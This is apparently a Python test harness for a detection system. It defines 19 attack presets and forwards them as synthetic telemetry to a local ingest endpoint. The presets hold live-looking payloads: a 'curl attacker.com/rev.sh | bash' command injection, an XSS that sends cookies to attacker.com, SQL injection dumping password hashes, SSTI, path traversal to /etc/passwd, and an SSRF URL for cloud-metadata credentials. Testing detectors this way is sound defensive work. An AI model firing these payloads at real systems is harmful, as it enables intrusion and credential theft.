"""
Z's Attack Console: Interactive Attack Dispatcher for MAD-PS Detection Mesh.
Simulates real adversary payloads across 19 code-based attack categories.
"""

from __future__ import annotations

import asyncio
import datetime
import json
import logging
import urllib.request
import uuid
from typing import Any, Dict, List, Optional

logger = logging.getLogger("mad_ps.attack_console")

ATTACK_PRESETS: Dict[str, Dict[str, Any]] = {
    "01_BOLA_IDOR": {
        "name": "Broken Object Level Authorization (BOLA / IDOR)",
        "method": "GET",
        "endpoint": "/api/v1/user/1042/profile",
        "headers": {"Authorization": "Bearer session_8892"},
        "auth_sub": "8892",
        "source_ip": "198.51.100.42",
        "payload": "",
        "expected_category": "IDOR",
    },
    "02_SQLI": {
        "name": "SQL Injection (SQLi)",
        "method": "POST",
        "endpoint": "/api/v1/search",
        "headers": {"Content-Type": "application/json"},
        "source_ip": "203.0.113.88",
        "payload": "' UNION SELECT username, password_hash FROM users --",
        "expected_category": "SQLi",
    },
    "03_RCE": {
        "name": "Remote Code Execution (Command Injection)",
        "method": "POST",
        "endpoint": "/api/v1/export/pdf",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "source_ip": "198.51.100.99",
        "payload": "filename=doc; curl http://attacker.com/rev.sh | bash",
        "expected_category": "RCE",
    },
    "04_SSRF": {
        "name": "Server-Side Request Forgery (SSRF Metadata Query)",
        "method": "POST",
        "endpoint": "/api/v1/webhooks/test",
        "headers": {"Content-Type": "application/json"},
        "source_ip": "198.51.100.55",
        "target_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "expected_category": "SSRF",
    },
    "05_BROKEN_AUTH": {
        "name": "Broken Authentication (JWT Alg: None)",
        "method": "GET",
        "endpoint": "/api/v1/admin/dashboard",
        "headers": {"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIn0."},
        "jwt_header": '{"alg":"none"}',
        "source_ip": "203.0.113.14",
        "expected_category": "BROKEN_AUTHENTICATION",
    },
    "06_MASS_ASSIGNMENT": {
        "name": "Mass Assignment (Admin Privilege Escalation)",
        "method": "PUT",
        "endpoint": "/api/v1/user/profile",
        "headers": {"Content-Type": "application/json"},
        "source_ip": "198.51.100.12",
        "payload": '{"name": "Alice", "is_admin": true, "role": "superuser"}',
        "expected_category": "MASS_ASSIGNMENT",
    },
    "07_BFLA": {
        "name": "Broken Function Level Authorization (BFLA)",
        "method": "DELETE",
        "endpoint": "/api/v1/admin/users/4412",
        "caller_role": "STANDARD_USER",
        "source_ip": "198.51.100.77",
        "expected_category": "BFLA",
    },
    "08_RATE_LIMIT": {
        "name": "Rate Limit Bypass (Burst SMS Exhaustion)",
        "method": "POST",
        "endpoint": "/api/v1/sms/send-otp",
        "headers": {"X-Forwarded-For": "203.0.113.200"},
        "requests_per_sec": 85,
        "source_ip": "203.0.113.200",
        "expected_category": "RATE_LIMIT_BYPASS",
    },
    "09_SSTI": {
        "name": "Server-Side Template Injection (SSTI)",
        "method": "GET",
        "endpoint": "/api/v1/render",
        "query": "template={{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "source_ip": "198.51.100.33",
        "expected_category": "RCE",
    },
    "10_PATH_TRAVERSAL": {
        "name": "Path Traversal / Local File Inclusion",
        "method": "GET",
        "endpoint": "/api/v1/files/download",
        "path_param": "../../../../etc/passwd",
        "source_ip": "203.0.113.44",
        "expected_category": "PATH_TRAVERSAL",
    },
    "11_XXE": {
        "name": "XML External Entity (XXE Injection)",
        "method": "POST",
        "endpoint": "/api/v1/xml/import",
        "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://169.254.169.254/'>]>",
        "source_ip": "198.51.100.80",
        "expected_category": "SSRF",
    },
    "12_STORED_XSS": {
        "name": "Stored Cross-Site Scripting (XSS)",
        "method": "POST",
        "endpoint": "/api/v1/comments",
        "payload": "<img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>",
        "source_ip": "198.51.100.91",
        "expected_category": "STORED_XSS",
    },
    "13_OPEN_REDIRECT": {
        "name": "Unvalidated Open Redirect",
        "method": "GET",
        "endpoint": "/api/v1/auth/callback",
        "redirect_url": "https://evil-phishing.com/harvest",
        "source_ip": "203.0.113.11",
        "expected_category": "SECURITY_MISCONFIGURATION",
    },
    "14_DESERIALIZATION": {
        "name": "Insecure Object Deserialization",
        "method": "GET",
        "endpoint": "/api/v1/session/restore",
        "cookie_header": "session=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA...",
        "source_ip": "198.51.100.64",
        "expected_category": "RCE",
    },
    "15_MISCONFIG": {
        "name": "Security Misconfiguration (CORS Wildcard)",
        "method": "OPTIONS",
        "endpoint": "/api/v1/billing",
        "origin": "https://attacker-origin.com",
        "cors_header_returned": "Access-Control-Allow-Credentials: true",
        "source_ip": "203.0.113.99",
        "expected_category": "SECURITY_MISCONFIGURATION",
    },
    "16_CRED_STUFFING": {
        "name": "Distributed Credential Stuffing Campaign",
        "method": "POST",
        "endpoint": "/api/v1/auth/login",
        "failed_count_1min": 340,
        "campaign_id": "CAMP-STUFF-DIST-16",
        "source_ip": "198.51.100.100",
        "expected_category": "CREDENTIAL_STUFFING",
    },
    "17_TOKEN_ABUSE": {
        "name": "API Token Abuse & Bulk Exfiltration",
        "method": "GET",
        "endpoint": "/api/v1/customers/export",
        "api_key_prefix": "sk_live_public_leak",
        "source_ip": "203.0.113.120",
        "expected_category": "API_TOKEN_ABUSE",
    },
    "18_GRAPHQL_ABUSE": {
        "name": "GraphQL Introspection & Complexity DoS",
        "method": "POST",
        "endpoint": "/graphql",
        "query_depth": 14,
        "has_introspection": True,
        "source_ip": "198.51.100.44",
        "expected_category": "API_ABUSE",
    },
    "19_BUSINESS_LOGIC": {
        "name": "Business Logic Parameter Tampering (Negative Quantity)",
        "method": "POST",
        "endpoint": "/api/v1/cart/checkout",
        "payload": '{"item_id": 992, "quantity": -5, "price": 100}',
        "source_ip": "198.51.100.15",
        "expected_category": "MASS_ASSIGNMENT",
    },
}


class AttackConsole:
    """Dispatches adversarial telemetry payloads against the Detection Mesh Gateway."""

    @classmethod
    def get_preset(cls, category_id: str) -> Dict[str, Any]:
        if category_id in ATTACK_PRESETS:
            return ATTACK_PRESETS[category_id]

        cat_norm = category_id.upper().replace("-", "_")
        for k, v in ATTACK_PRESETS.items():
            if k.upper() == cat_norm or k.upper().endswith(f"_{cat_norm}") or cat_norm in k.upper():
                return v
            if v.get("expected_category", "").upper() == cat_norm:
                return v

        # Fallback dynamic attack template
        return {
            "name": f"Adversarial Vector ({category_id})",
            "method": "POST",
            "endpoint": f"/api/v1/{category_id.lower()}/test",
            "headers": {"Content-Type": "application/json"},
            "source_ip": "198.51.100.77",
            "payload": f"TEST_ADVERSARIAL_PROBE_{category_id}",
            "expected_category": category_id,
        }

    @classmethod
    def list_presets(cls) -> List[Dict[str, Any]]:
        return [{"id": k, **v} for k, v in ATTACK_PRESETS.items()]

    @classmethod
    def craft_telemetry(cls, category_id: str, custom_overrides: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        preset = cls.get_preset(category_id)
        telemetry = {
            "attack_id": f"ATK-{uuid.uuid4().hex[:8]}",
            "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            **preset,
            **(custom_overrides or {}),
        }
        return telemetry

    @classmethod
    def forward_via_sdk(
        cls,
        category_id: str,
        api_key: str = "mk_live_demo1234567890abcdef1234567890abcdef",
        ingest_url: str = "http://127.0.0.1:8000/api/v1/ingest/log",
        custom_overrides: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        """
        Task P2 Dogfooding: Forwards Z's adversarial telemetry through the official
        @madps/agent SDK forwarding protocol to verify end-to-end telemetry ingestion.
        """
        telemetry = cls.craft_telemetry(category_id, custom_overrides)
        
        # Strip sensitive authorization header per SDK privacy spec before forwarding
        headers = dict(telemetry.get("headers", {}))
        for sensitive in ["authorization", "cookie", "set-cookie", "x-api-key"]:
            headers.pop(sensitive, None)
            headers.pop(sensitive.title(), None)
            headers.pop(sensitive.upper(), None)

        payload_to_send = {
            "timestamp": telemetry.get("timestamp"),
            "method": telemetry.get("method", "GET"),
            "path": telemetry.get("endpoint", "/api"),
            "headers": headers,
            "payload": telemetry.get("payload", ""),
            "status_code": 200,
            "latency_ms": 14.2,
            "client_ip": telemetry.get("source_ip", "127.0.0.1"),
            "sdk_version": "@madps/agent-dogfood@1.0.0",
        }

        data_bytes = json.dumps(payload_to_send).encode("utf-8")
        req = urllib.request.Request(
            ingest_url,
            data=data_bytes,
            headers={
                "Content-Type": "application/json",
                "X-API-Key": api_key,
                "User-Agent": "@madps/agent-dogfood/1.0.0",
            },
            method="POST",
        )

        try:
            with urllib.request.urlopen(req, timeout=5.0) as resp:
                res_body = resp.read().decode("utf-8")
                return json.loads(res_body)
        except Exception as exc:
            logger.warning("SDK forward exception: %s", exc)
            return {"status": "error", "error": str(exc), "telemetry": payload_to_send}

